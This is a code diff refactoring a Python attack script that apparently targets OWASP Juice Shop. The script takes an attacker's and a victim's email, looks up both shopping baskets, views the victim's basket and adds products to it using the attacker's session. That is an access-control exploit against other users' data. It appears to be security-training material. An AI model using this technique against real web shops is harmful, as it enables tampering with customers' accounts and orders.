@@ -15,13 +15,16 @@ import random
 class manipulate_basket(a.attack_inter):
     def __init__(self):
         self.juice_session = a.requests.session()
-
-    def set_info(self, email, victimEmail):
+        print("please enter attacker's email")
+        email = input()
+        print("please enter victim's email")
+        victimEmail = input()
         self.email = email
         self.victimEmail = victimEmail
         self.basketId = a.get_basket_id(self.email)
         self.victimBid = a.get_basket_id(self.victimEmail)
         self.cookie, self.header = a.get_auth(self.email)
+        self.productId = self.generate_productID(self.basketId)
 
     def view_basket(self, basektId):
         print('-----------------------------------------------------')
@@ -53,11 +56,10 @@ class manipulate_basket(a.attack_inter):
             count += 1
         return pId
 
-    def addto_basket(self, quantity):
+    def addto_basket(self, quantity, productId):
         print('---------------------------------------------------')
         print("Let us add to basket ID {} ----------------".format(self.basketId))
         try:
-            productId = self.generate_productID(self.basketId)
             print("we will add product Id {} ".format(productId))
             json = {
                 "ProductId": productId,
@@ -77,20 +79,14 @@ class manipulate_basket(a.attack_inter):
         return self.basketId
 
     def run(self):
-        a.logging.basicConfig(filename='./test_logging_info.log', 
+        a.logging.basicConfig(filename='./test_logging_info.log',
                             level=a.logging.INFO, format='%(asctime)s %(message)s')
         a.logging.Formatter.converter = time.gmtime
         logger = a.logging.getLogger("Manipulate Basket")
         a.logging.info(logger)
         a.logging.info('Started')
-
-        print("please enter attacker's email")
-        email = input()
-        print("please enter victim's email")
-        victim_email = input()
-        self.set_info(email=email, victimEmail=victim_email)
         self.view_basket(self.victimBid)
-        self.addto_basket(quantity=1)
+        self.addto_basket(quantity=1, productId=self.productId)
         a.logging.info('Finished')
 
 
